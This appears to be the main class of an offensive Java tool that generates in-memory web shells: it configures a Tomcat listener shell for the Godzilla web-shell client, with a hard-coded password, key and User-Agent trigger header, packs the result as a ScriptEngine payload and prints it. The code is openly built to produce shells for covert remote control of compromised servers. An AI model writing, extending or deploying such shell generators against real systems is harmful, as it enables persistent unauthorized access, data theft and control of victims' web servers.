package com.reajason.javaweb;

import com.reajason.javaweb.config.*;
import com.reajason.javaweb.memsell.packer.Packer;
import com.reajason.javaweb.memsell.tomcat.TomcatShell;

import java.io.IOException;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class GeneratorMain {
    public static void main(String[] args) throws IOException {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.TOMCAT)
                .shellTool(ShellTool.Godzilla)
                .shellType(TomcatShell.LISTENER).build();
        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass123")
                .key("key123")
                .headerName("User-Agent")
                .headerValue("test")
                .build();

        byte[] bytes = generate(shellConfig, new InjectorConfig(), godzillaConfig, Packer.INSTANCE.ScriptEngine);
        if (bytes != null) {
            System.out.println(new String(bytes));
        }
    }

    public static GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        switch (shellConfig.getServer()) {
            case TOMCAT:
                return TomcatShell.generate(shellConfig, injectorConfig, shellToolConfig);
            case BES:
                break;
            case RESIN:
                break;
            case JETTY:
                break;
            default:
                throw new IllegalArgumentException("Unsupported server");
        }
        return null;
    }

    public static byte[] generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig, Packer.INSTANCE packerInstance) {
        GenerateResult generateResult = generate(shellConfig, injectorConfig, shellToolConfig);
        if (generateResult != null) {
            return packerInstance.getPacker().pack(generateResult);
        }
        return null;
    }
}